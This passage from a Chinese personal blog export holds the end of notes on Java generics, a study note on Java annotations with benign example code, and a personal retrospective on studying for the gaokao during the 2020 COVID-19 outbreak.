<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span> == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们这样自定义一个方法的时候：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(T another)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于它的 T 实际上会被编译器搞成 Object ，所以导致了这个方法的签名和 Object 类的 equals 的方法签名相同，导致了意外的覆写父类的方法，由于看起来 T 和 Object 不一样，所以可能不太在意，但是实际上经过编译器处理过后，两者是一样的！</p>
<h2 id="使用泛型"><a href="#使用泛型" class="headerlink" title="使用泛型"></a>使用泛型</h2><h3 id="普通使用"><a href="#普通使用" class="headerlink" title="普通使用"></a>普通使用</h3><p>对于最普通的泛型使用，就是代替 Object 来接受各种不同的类。其实最开始引入泛型概念的时候就已经讲述过了。</p>
<h3 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h3><p>可以在接口中使用泛型，在实现接口的时候，可以选择固定接口的 &lt;T&gt; 为特定类型，或者直接沿用接口的 &lt;T&gt; 。</p>
<h3 id="继承泛型"><a href="#继承泛型" class="headerlink" title="继承泛型"></a>继承泛型</h3><p>前面说了，因为本质上泛型实现是 Object 实现的，只不过是编译器记住了所属于的类型，给它加了一个强制转型，我们无法通过一个实例来得到泛型的具体类型。但是凡事都有例外，我们可以用特殊的方法来实现这样的需求。</p>
<p>答案就是用一个子类去继承父类，然后我们就可以通过子类的实例来获取父类的泛型的具体类型。这是因为子类的 <code>.class</code> 文件是包含了父类的所有信息的，自然也包括父类的泛型。但是获取的方法有点麻烦，就不研究了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xorex</span> <span class="keyword">extends</span> <span class="title">Tempest</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就可以通过 Xorex 的实例来获得父类 Tempest 的泛型类型为 String。</p>
<h3 id="静态方法使用泛型"><a href="#静态方法使用泛型" class="headerlink" title="静态方法使用泛型"></a>静态方法使用泛型</h3><p>首先说明：在静态方法中使用泛型的方法格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Xorex(T Info) </span><br></pre></td></tr></table></figure>
<p>与普通的方法不同的是在 static 后面多了一个 &lt;T&gt; 就像在 class 名字后面多了一个 &lt;T&gt; 是一样的，表示声明一个要使用的泛型。因为静态方法是脱离类的实例使用的，所以无论它的类 class 名字后面声明了几个泛型，都和静态方法无关，那些泛型都是在实例化的时候才会被编译器确定类型，静态方法的使用和实例化无关。</p>
<p>于是，静态方法需要自己定义自己需要的泛型，上面的 static 后面的 &lt;T&gt; 就是 Xorex 方法自己定义的泛型，通过传入的参数 Info 的类型来确定 &lt;T&gt; 的具体类型，如果无法通过传入参数来确定的话，则默认为 Object 类型。如果静态方法所在类也拥有泛型的话，建议静态方法的泛型命名避开类的命名，毕竟两者是不同的东西。</p>
<h3 id="多泛型类型"><a href="#多泛型类型" class="headerlink" title="多泛型类型"></a>多泛型类型</h3><p>只需要在 &lt;&gt; 里面用逗号分隔开多个泛型即可，比如 &lt;T,K&gt; 就成功声明了两个泛型，使用的时候：&lt;String,Integer&gt; 即可。</p>
<h2 id="泛型通配符"><a href="#泛型通配符" class="headerlink" title="泛型通配符"></a>泛型通配符</h2><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符 ?"></a>通配符 ?</h3><p>对于一个含有泛型的类来说，如果不确定具体的泛型是谁，尤其是当它要作为参数传入一个方法的时候，我们现在的认知来说，有两种方法实现：</p>
<p>第一种是在本方法所在的类名后定义一个泛型，然后再方法参数中加入这个泛型，在实例化的时候就把类型确定下来。但是在一个本来就是有泛型的类中的话，会影响其他方法中的泛型，而且如果使用者不会使用这个方法，还要白白在实例化的时候加上类型限制。</p>
<p>第二种是将这个方法改成静态方法，和类的实例脱节，自创一套泛型系统来使用。但是这可能会破坏封装性和完整性，自创泛型系统也有点小麻烦。</p>
<p>这里可以引入第三种解决方法，使用 <code>?</code> 通配符，表示不确定的泛型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Xorex</span><span class="params">(Tempest&lt;?&gt; a)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样这个方法就可以接收所有 Tempest 的任意具体泛型。</p>
<h3 id="泛型的上限限定"><a href="#泛型的上限限定" class="headerlink" title="泛型的上限限定"></a>泛型的上限限定</h3><p>上限限定使用 extends 表示，可以用在类名后声明泛型： <code>class Tempest&lt;T extends Number&gt;</code> 和方法接收参数：<code>public void Xorex(&lt;? extends Number&gt;)</code>。</p>
<p>两者都表示接收的类型必须是 Number 及其子类，相当于给泛型一个上限限定，类在抽象不能超过 Number 的范围，这样里面的代码可以专注于只处理数字，不用担心有其他奇奇怪怪的类型。</p>
<h3 id="泛型的下限限定"><a href="#泛型的下限限定" class="headerlink" title="泛型的下限限定"></a>泛型的下限限定</h3><p>下限限定使用 super 表示，使用方法和上面的 extends 相同，其实这两种上限和下限以及泛型与反射有更加巧妙地用途，可惜现在的我暂时能力有限，看的不是太懂，先建立起整个 Java 知识体系。具体的这些，以后一定会再次详细的，透彻的研究一遍的。</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>泛型</tag>
      </tags>
  </entry>
  <entry>
    <title>Java注解学习笔记</title>
    <url>/2021/01/10/ea03bffbefdc/</url>
    <content><![CDATA[<h2 id="Java-注解"><a href="#Java-注解" class="headerlink" title="Java 注解"></a>Java 注解</h2><p>对于 Java 的注解，其实前面我们已经接触过了，在对接口或者抽象类的方法进行重写的时候，我们会在重写的方法的前面加上 <code>@Override</code> 这个注解，注意这个是注解不是注释，注释是完全被编译器忽略的东西，而注解并不会被忽视，是会被编译器处理的。这个注解的作用就是让编译器帮我们检查我们重写的方法是否正确。</p>
<p>按照 Java 中一切皆为对象来看，注解也自然是对象了（其实准确的说，<strong>注解本质上是一个接口</strong>，继承于 java.lang.annotation.Annotation ），下面的代码就是 <code>@Override</code> 注解的声明：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.SOURCE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Override &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="注解的作用"><a href="#注解的作用" class="headerlink" title="注解的作用"></a>注解的作用</h3><p>注解在 Java 中一般拥有三个用途：</p>
<ol>
<li><p>用来编写文档</p>
</li>
<li><p>用来编译检查</p>
</li>
<li><p>用来代码分析</p>
</li>
</ol>
<p>这些用途我们一点一点的说：</p>
<h3 id="用来编写文档"><a href="#用来编写文档" class="headerlink" title="用来编写文档"></a>用来编写文档</h3><p>记得我最开始在写 Java 的基础笔记里面，提到了 JDK 里面是拥有一个叫作 <code>javadoc.exe</code> 的程序，这个程序的作用就是从 Java 代码中提取注释，然后整合成文档。我们同样可以在我们自己的代码中对这些进行尝试，用注解标识自己的代码，然后使用 <code>javadoc.exe</code> 程序将这些注解进行提取，生成自己代码的一个功能文档。</p>
<p>首先是利用注解对代码进行标注，下面代码写了一个类中，一个 main 方法和一个将字符串自身累加一次的 PlusOnce 方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Java.test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This class is discribe the test.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;First of all, this class is the best class in the world.</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;&lt;li&gt;The</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;best</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;class!&lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Xorex</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK 1.8</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This method is the main method.</span></span><br><span class="line"><span class="comment">     * And it only output a number 10000;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> Xorex</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args Parameter is the orders.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a=<span class="number">10000</span>;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This method is the PlusOnce method:</span></span><br><span class="line"><span class="comment">     * So what is the best of the String plus String?</span></span><br><span class="line"><span class="comment">     * Just plus it!</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> Xorex</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a Input a String a.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The double lenght of the a,to be a+a .</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IOException It will throw IOException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> IOException </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@deprecated</span> It is not good yet.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">PlusOnce</span><span class="params">(String a)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 Java 中自带的一些注解对类和方法进行了一个比较基本的描述，需要注意的是，Java 中使用的注释为单行注释  <code>//</code> 多行注释 <code>/**/</code> ，但是注解与他们不同，使用的是这样： <code>/** */</code>  要比多行注释多了一个星。我们的注解就写在里面。里面的注解描述的都是很基本的信息，然后使用命令 <code>javadoc test.java</code> 成功生成了一堆网页文件，打开 <code>index.html</code> 就可以看到生成的文档了。</p>
<p><img src="https://xorex.space/image/155.jpg"></p>
<p>点开之后里面就有很多东西了，我们所有的标注都被提取出来，变成了一个文档。</p>
<h3 id="用来编译检查"><a href="#用来编译检查" class="headerlink" title="用来编译检查"></a>用来编译检查</h3><p>比如以前使用的的 <code>@Override</code> 来检查是否重写方法正确，使用 <code>@SuppressWarnings</code>  来让编译器忽略此处代码产生的警告信息。</p>
<p>注解也是拥有参数的，比如 <code>@SuppressWarnings</code>  就拥有一个类型为 String 的参数，用来接收数据，从而命令编译器忽略哪一种类型的警告，下面是输入参数对应的各种效果：</p>
<ul>
<li>all 压制所有的警告</li>
<li>deprecation 压制使用不赞成类和方法警告</li>
<li>unused 压制未使用变量警告</li>
<li>unchecked 压制未检查转化警告</li>
<li>path 压制路径不存在警告</li>
</ul>
<p>使用方法就是在语句前加上  <code>@SuppressWarnings(&quot;all&quot;);</code></p>
<h3 id="用来代码分析"><a href="#用来代码分析" class="headerlink" title="用来代码分析"></a>用来代码分析</h3><p>这是对于我们一个普通的开发者来说，注解的用途就是来帮助我们进行分析代码。我们可以自己写一个用来处理代码的工具比如一个测试代码是否有运行错误的工具。那么这个工具是如何知道应该运行哪些代码，应该以什么方式运行代码呢？这就用到了注解，我们利用注解对代码进行标注，然后代码分析工具读取我们的标注，按照标注的注解来决定如何处置这些代码，这是我们一般自定义注解的用途。</p>
<h2 id="注解的组成"><a href="#注解的组成" class="headerlink" title="注解的组成"></a>注解的组成</h2><h3 id="注解的声明"><a href="#注解的声明" class="headerlink" title="注解的声明"></a>注解的声明</h3><p>Java 的注解组成来看，先看看上面我们介绍过的注解 <code>@SuppressWarnings</code> 的定义代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE, MODULE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.SOURCE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> SuppressWarnings &#123;</span><br><span class="line">    String[] value(); <span class="comment">//这东西看起来像一个抽象方法，但是实际上是个属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先声明使用方法自然是 public 类型的 <code>@interface</code> + 注解名 来声明出来一个拥有名字的注解，注解内部用来声明注解需要输入的参数，比如上面的参数输入就是一个字符串数组，参数名为后面设置的 value，可以在参数声明后面加上默认值，作用就是在使用这个注解的时候，没有输入此参数的时候，这个参数会接受默认值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;Xorex&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> 100</span>;</span><br></pre></td></tr></table></figure>
<h3 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h3><p>上面除了像声明了一个接口一样声明了一个注解的代码，还有一些注解与注解定义的注解，比如上面的 <code>@Target</code> 和 <code>@Retention</code>  ，他们被叫作元注解，下面是在 Java 中内置的一些元注解</p>
<h4 id="1-Target"><a href="#1-Target" class="headerlink" title="1. @Target"></a>1. @Target</h4><p>Target 注解用来定义声明的这个 Annotation 能够被作用的位置，是定义注解时必须加上的元注解。</p>
<p>Target 接受的参数是一个枚举类型的数组，叫作 <code>ElementType[]</code> 这个枚举类型里面拥有定义好的元素，分别对应不同的作用位置：</p>
<ul>
<li>类或接口：<code>ElementType.TYPE</code>；</li>
<li>字段：<code>ElementType.FIELD</code>；</li>
<li>方法：<code>ElementType.METHOD</code>；</li>
<li>构造方法：<code>ElementType.CONSTRUCTOR</code>；</li>
<li>方法参数：<code>ElementType.PARAMETER</code>。</li>
</ul>
<p>如果需要定义多个可作用位置，只需要把他们构造成一个数组即可。</p>
<h4 id="2-Retention"><a href="#2-Retention" class="headerlink" title="2. @Retention"></a>2. @Retention</h4><p>Retention n. 保留，扣留，记忆力。这个元注解用来定义 Annotation 的生命周期。</p>
<p>Retention 接受的参数同样也是一个枚举类型的单个常量，叫作 <code>RetentionPolicy</code> ，这个枚举类有一下的选项：</p>
<ul>
<li><code>RetentionPolicy.SOURCE</code> 表示此注解的生命周期可以维持到源码中存在，编译完就会被丢掉。</li>
<li><code>RetentionPolicy.CLASS</code>  表示此注解的生命周期可以维持到编译文件 .class 中存在，会被留在编译文件里。</li>
<li><code>RetentionPolicy.RUNTIME</code> 表示此注解的生命周期可以维持到运行时，会被 JVM 读取并处理。</li>
</ul>
<p>如果不加入这条注解，那么默认生命周期为 <code>RetentionPolicy.CLASS</code> 级别，但是考虑到一般来说，我们自定义的注解作用的生命周期都是运行时，所以需要加上  <code>RetentionPolicy.RUNTIME</code> 这一条设置。</p>
<h4 id="3-Repeatable"><a href="#3-Repeatable" class="headerlink" title="3. @Repeatable"></a>3. @Repeatable</h4><p>用于表示我们自定义的 Annotation 是否被允许重复注解一个元素。</p>
<p>使用方法就是在定义 Annotation 的时候，用此 Annotation 经过编译之后的文件名作为元注解 @Repeatable 的参数，就可以设置此 Annotation 在使用的时候，可以重复作用与同一个元素了。</p>
<p>不过感觉这个东西用处不大啊，如果要传入多条参数的话，直接修改注解定义的参数即可了。</p>
<h4 id="4-Inherited"><a href="#4-Inherited" class="headerlink" title="4. @Inherited"></a>4. @Inherited</h4><p>Inherited adj. 遗传的，继承的。 这个用来表示对于某 Annotation，注解了父类之后，子类是否会继承这个注解。需要注意的是这个元注解只能作用与同时拥有 <code>Target(ElementType.TYPE)</code>  元注解的 Annotation，因为有 @Inherited 的前提是有继承关系，因为只有类和接口能被继承，所以才有这样的硬性规定。</p>
<p>如果某 Annotation 允许子类从父类或接口那里继承与自己的话，只需要在定义 Annotation 的前面加上元注解 <code>@Inherited;</code>  即可，不需要填写任何参数。</p>
<h4 id="5-Documented"><a href="#5-Documented" class="headerlink" title="5. @Documented"></a>5. @Documented</h4><p>在使用 javadoc.exe 进行抽取一个 java 文件里面的类的信息的时候，自定义的注解一般不会被提取并显示在生成的文档中，也就是说，我们在 javadoc.exe 看一个类的信息的时候，如果使用了自定义的注解，那么默认这些是在类信息里面看不到的，我们不知道这个类有没有使用某种特定的注解。</p>
<p>如何让使用某个我们自定义注解的类，它提取文档里面有此类使用了我们定义的注解的信息呢？</p>
<p>答案就是在定义这个注解的时候，在这个注解前面加上元注解 @Documented 即可。这样凡是使用了这个注解的了类，在自己的文档里面就会有体现使用我们定义注解的信息了。</p>
<h3 id="定义-Annotation"><a href="#定义-Annotation" class="headerlink" title="定义 Annotation"></a>定义 Annotation</h3><p>综上，我们可以总结出来定义一个 Annotation 的方法：</p>
<p>首先使用 @interface 定义一个拥有名字的注解，然后往此注解中添加参数，建议所有的参数就加上默认值，最后使用元注解对自己定义的 Annotation 进行修饰。</p>
<h2 id="利用自定义的注解"><a href="#利用自定义的注解" class="headerlink" title="利用自定义的注解"></a>利用自定义的注解</h2><h3 id="获取被标注的注解的实例"><a href="#获取被标注的注解的实例" class="headerlink" title="获取被标注的注解的实例"></a>获取被标注的注解的实例</h3><p>实际上利用自定义的注解主要是利用 RUNTIME 类型的注解，而要按照标注的注解处理程序，就需要读取到这些注解，并分析注解里面的属性值。注解是依托于被标注物存在的，所以我们读取这些标注的方法就是依靠被标注物的反射机制获取的。</p>
<p>对于一个类来说，可以通过使用反射获取一个保存了它 <strong>所有信息</strong> 的 Class 类的实例，既然是所有信息，那么也包括它的注解，而获取注解的方法就是使用 Class 类中的方法。同理，对于方法，字段，构造器的反射出来的实例也有用来处理注解的方法，比如判断某个注解是否标注（参数里的 Class 为注解的 Class 类实例（本质是接口嘛））：</p>
<ul>
<li>Class.isAnnotationPresent(Class)</li>
<li>Field.isAnnotationPresent(Class)</li>
<li>Method.isAnnotationPresent(Class)</li>
<li>Constructor.isAnnotationPresent(Class)</li>
</ul>
<p>举个例子，判断类 Tempest 中的方法 Xorex() 中是否有注解 <code>@Override</code> :</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tempest.class.getMethod(<span class="string">&quot;Xorex&quot;</span>).isAnnotationPresent(Override.class);</span><br></pre></td></tr></table></figure>
<p>当然还可以直接获取注解的 Class 实例，使用的是下面，返回的是标记此元素注解的实例（包括具体的属性的）：</p>
<ul>
<li>Class.getAnnotation(Class)</li>
<li>Field.getAnnotation(Class)</li>
<li>Method.getAnnotation(Class)</li>
<li>Constructor.getAnnotation(Class)</li>
</ul>
<p>或者直接返回所有的注解，返回类型是 Annotation[]：</p>
<ul>
<li>Class.getAnnotations()</li>
<li>Field.getAnnotations()</li>
<li>Method.getAnnotations()</li>
<li>Constructor.getAnnotations()</li>
</ul>
<p>所以利用反射机制获取注解实例的方法有两种，一种是先判断有没有，然后再获取，另外一种是直接获取，如果没有就会返回 null 注意处理这种返回情况就可以了。</p>
<hr>
<p>这里有一个比较特殊的注解获取，因为能被注解标注的，除了上面几个意外，还有方法的参数们。而参数们又对应着不止一个注解，所以 Method.getParameterAnnotations() 返回的是一个 Annotation[][] 的二维数组，第一维对应的是不同的参数，第二维对应的是参数的不同注解。</p>
<h3 id="利用注解信息处理代码"><a href="#利用注解信息处理代码" class="headerlink" title="利用注解信息处理代码"></a>利用注解信息处理代码</h3><p>现在我们知道了如何获取被标注代码中的注解信息，那么我们就可以根据这些注解信息的不同，采用不同的方式处理这些代码，比如我们可以写一个测试框架，对于输入的一个类，获取所有的方法，然后对于每一个方法，判断是否存在注解 <code>@Test</code> ，若存在，则利用反射执行这个方法，判断是否抛出异常从而记录日志。如果没有注解 <code>@Test</code> ，那么就不测试，最后输出测试日志。</p>
<p>这就是注解的一个用途，帮助程序分析程序。</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>注解</tag>
      </tags>
  </entry>
  <entry>
    <title>我的2020年</title>
    <url>/2021/01/10/be626d8ced18/</url>
    <content><![CDATA[<h2 id="这神奇的一年"><a href="#这神奇的一年" class="headerlink" title="这神奇的一年"></a>这神奇的一年</h2><p>2020 年一直对于我来说都是一个很神奇的年份，可能是因为这是 21 世纪第二个十年的最后一年吧，各种宏伟的计划的实现时间都定在了 2020 年。出于对美好未来的向往，自然十分期待 2020 年的到来，而当我开始写下这篇回忆录的时候，2020 已经接近尾声了，站在年末，不得不说，2020 真的是一个很神奇的年份，无论是对于世界还是我。</p>
<p>本来作为懒狗的我是不太想写这些东西的，但是想到自己差到爆炸的记忆力，觉得还是有必要把这些经历都记录下来，因为今年发生的事情还都是非常有纪念意义的，无论是好的方面还是差的方面，2020 年真的是让人又爱又恨啊。</p>
<h2 id="绝不松懈的复习"><a href="#绝不松懈的复习" class="headerlink" title="绝不松懈的复习"></a>绝不松懈的复习</h2><p>在 2020 的开头，最深的记忆还是和丹阳同学一起学习的时候的情景，有一个能一同努力的伙伴真的是非常棒的体验。那个时候的我学习状态处于最巅峰的时候，每天的学习任务都安排的满满的，和丹阳同学讨论题目，一起进步，最后在寝室锁门前的 5 分钟冲刺回去，路上还要记忆一两个知识点。也正是和他坐在一起的时间里面，我学到了他的一些高效的学习方法，印象最深的是用一个总结本去记录所有重要 知识点/易错点，然后早读的时候拿出来进行记忆，这个习惯一直陪伴到了我高考结束，也帮助了我很多。</p>
<blockquote>
<p>我们两个人的座位：</p>
</blockquote>
<p><img src="https://xorex.space/image/143.jpg" alt="我们两个人的座位"></p>
<p>紧张的学习生活中也有一些令人放松的事情，比如拍一拍的美景：</p>
<blockquote>
<p>寝室6楼阳台眺望市区：</p>
</blockquote>
<p><img src="https://xorex.space/image/144.jpg"></p>
<blockquote>
<p>早上联考开始之前的天空：</p>
</blockquote>
<p><img src="https://xorex.space/image/145.jpg"></p>
<blockquote>
<p>晚自习下课测试刚更新 Flyme 的超级夜景：</p>
</blockquote>
<p><img src="https://xorex.space/image/146.jpg"></p>
<p>除了拍照片来放松，研究微积分也成为了那个时候我的乐趣之一。当时一边在 bilibili 上看 3b1b 的微积分视频，一边在下面证明各种课本上的求导公式，差点走火入魔。也正这有些不务正业的学习研究，让我对原理有了非常执着的追求和欲望。后来由于复习到了解析结合，复杂的运算才让我缓了缓学习方向，开始面向高考学习的刷题生涯之中（因为解析几何让我计算的非常痛苦，我甚至还买了好几本质量非常棒的纸来算题）。</p>
<p>由于一轮复习的进度飞快，导致我一些知识点根本来不及学习，只能不断的追求老师的进度，所以就给自己定下了寒假用来查漏补缺的任务，计划美好的让我不禁对寒假期待满满。期间还有了两条新闻，一条就是晚自习前的新闻播报了武汉华南海鲜市场出现了不明病毒，另外一条是教育部发布的取消自主招生的信息。在当时，我显然只主要到了后者，研究着它对我升学的影响。当时的我认为中国的医疗水平已经很厉害了，即使遇到过去的非典那样的病毒，也能很快的解决，抱着对社会主义的无比优越性的信念，我根本没有把它放在心上，更别说关心后续发展了。</p>
<h2 id="寒假要查漏补缺"><a href="#寒假要查漏补缺" class="headerlink" title="寒假要查漏补缺"></a>寒假要查漏补缺</h2><p>美好的寒假也如期到来，我和丹阳一起选择了放弃过春节返校学习，虽说当时病毒已经感染了好几百人，但一是武汉已经封城，对国家力量的非常信任，二是觉得那是发生在武汉的事情，距离几千公里之外的小城市应该不会受到什么影响。所以，还是满脑子想的是寒假的各种学习安排，根本没有把病毒放在心上。</p>
<p>留校学习的时光非常快乐，我带来了寝室的台灯，丹阳搬到窗户旁边，有了光，学习就没有阻力了。一天主要就是在学习的沉默中度过的，当然偶尔也会在一起交流一下一些习题。第一天中午我们跑去河南理工大学的门口解决了午饭，虽说吃的挺不错的，但是还是觉得跑那么远太麻烦了，索性就买了七八桶泡面，作为后面时间的存粮。</p>
<p>留在学校里面学习的，除了我们两个男生，还有路sir。不过身为一个女生，她自然对安全问题比较在意，面对病例不断增加的疫情，她在除夕之前就收一堆教材跑回家学习了。丹阳因为过年要在老家呆两天，临走前也带走了一堆书，只有我仗着不回老家，而且想要给自己在新年第一天放个假，就什么都没带回家过年去了。</p>
<p>万万没想到，大年初二，全国戒严了……</p>
<p>当我带着口罩骑着电动车开开心心到学校门口之后，保安叔叔给我来了个赶快离开的手势，然后说，学校封校了，赶快回家。我傻了，只能骑着电动车回去了。到家之后，因为自己的寒假计划完全被打乱了，也不知道该干什么，只能背背单词看看错题划划水，等待着寒假结束。</p>
<p>但是全国的疫情已经越来越严重了，武汉病例随着大规模检测的铺开开始飞升，全国其他地方也开始不断新增病例。这个时候，我就知道开学已经没有希望了，寒假必然延期。果然在初六的时候，老师宣布假期延长了10天，剩余时间的学习转为线上学习。老师给我们发了一个课程表，每科老师会在课程表对应的时间给我们发一些电子版本的学习资料，让我们去写。虽说每天写的都很水，但是还是跟着老师开始了线上的学习。</p>
<h2 id="本质还是老懒狗"><a href="#本质还是老懒狗" class="headerlink" title="本质还是老懒狗"></a>本质还是老懒狗</h2><p>线上学习的前几天我还跟着认真的学习一下，到了后面厌学情绪飞涨，坐在电脑面前让我来学习？于是我的摸鱼时间越来越长，作业也开始复制粘贴，各种东西都开始应付起来了。每天我的日常就是早上 6:30 起床，然后趴在床上旁边放一本书装作在学习知识点，实则趴在抱枕上睡大觉。睡到了早晨 9 点，起床打开电脑，查看新更新地疫情数据，然后打开知乎开始看热榜，看完热榜打开 bilibili 看视频，看到中午之后就去吃午饭，下午到晚上重复上述状态。</p>
<p>大概就是这样一直在假装学习，因为真的是学不进去，这是我很小很小的时候就有的习惯了，在家里只想玩，一点学习的欲望都没有。强制自己去认真学习也效果不大，因为根本没有任何效果，该怎么样还是怎么样，于是就破罐子破摔了。</p>
<p>疫情也随着时间的流逝不断地发展着，湖北每天数千例地增加，病毒在全国开始蔓延，每个人都忧心忡忡，医疗队援助湖北，火神山雷神山医院飞速搭建。这是中国的至暗时刻，那种恐惧和无力的感觉，笼罩着每一个人。</p>
<p>大概就是这样经过了一个月的时间，吃喝玩乐然后再后悔，后悔完再吃喝玩乐。看动漫逛知乎写代码，除了学习啥都干了。全国的疫情还没有看到停止的希望，我一度认为我的高四要白给了，每天看着高考倒计时越来越短，有种绝望的感觉，于是开始安慰自己二本学校也不错，只要能学计算机就行。</p>
<p>后来国内疫情开始慢慢好转了起来，国外开始爆发了。英国搞全体免疫，意大利猛超中国，美国穷追不舍，各种神奇的骚操作看呆了。然后国内病例开始慢慢减少，似乎有了开学的希望？终于到了 3 初，河南病例清零，焦作也 15 天没有新增，老师通知我们，做好 3 月 15 日开学的准备。</p>
<p>在家里划水了一个多月的我开心极了，如果 3 月 15 号能开学的话，自己的高四还能拯救一下。然而盆冷水很快泼了下来，开学时间又延长了。我只能在家继续划水，等待着新的消息进展。这个时候郑州突然冒出来了一例新增，此人趁着放假跑去了意大利看球赛，意大利因为疫情爆发取消了球赛，他在意大利玩了几天之后就绕路回国了，然后隐瞒行踪，继续上班，结果被查出了新冠阳性，被网友骂了个狗血淋头。</p>
<p>原本看到了开学曙光的我直接绝望，如果郑州出现了疫情，那么开学继续遥遥无期，我开始学习也遥遥无期。虽说中间老师有从学校给我们带来过一些学习资料，但是在家的我根本没有办法进入学习状态，想要认真的学习只能回到学校里面。</p>
<h2 id="好像还有得救啊"><a href="#好像还有得救啊" class="headerlink" title="好像还有得救啊"></a>好像还有得救啊</h2><p>后来有两个消息，一个是河南教育厅公布了河南省初高三的返校时间是四月七号，另外一个是国家教育局公布了 2020 年的高考时间延长一个月，改为七月七日。这两个消息在同一天公布，知道了这些的我开心到爆炸，还是有机会的，还剩下三个月的时间，还是能拯救一下我的文化课的。</p>
<p>开学的时间如期而至，学校的防疫措施也非常完善，寝室被分隔开来来，所有学生错峰吃饭，餐厅的桌子全部使用隔板隔开，每个人有自己固定的座位。但是唯一的槽点就是统一的饭真的是太难吃了，无法想象的难吃，于是到了后期就是泡面的天下了。</p>
<p>开学自然要开始测试来检测自己的学习成果，于是开学考就来了，然而奇怪的是，在家里完全没有学习的我反而考了最好的名次，好迷啊。为了修补自己在家里欠下的二轮复习，就开始疯狂的刷起来教材，发现做题越来越顺，各种题型也都开始通晓了它们的套路，成为了做题能力疯狂增长的做题家。</p>
<p>我的高考有救了！</p>
